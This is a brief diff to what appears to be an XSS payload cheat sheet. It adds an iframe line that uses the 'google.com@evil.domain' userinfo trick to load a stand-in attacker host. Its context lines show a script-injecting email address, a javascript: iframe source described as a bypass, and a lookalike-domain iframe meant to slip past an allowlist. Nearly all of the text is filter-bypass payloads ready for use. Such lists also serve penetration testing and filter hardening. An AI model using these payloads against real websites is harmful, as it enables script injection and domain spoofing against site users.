@@ -73,7 +73,7 @@ test@example(<script>alert(0)</script>).com
 ```
 <iframe src="javascript:alert('XSS')"> #use href bypass
 <iframe src="https://youtube.com.evil.domain/ "> # if youtube is whitelisted for example
-
+<iframe src="https://google.com@evil.domain">
 ```
 
 ### Alert
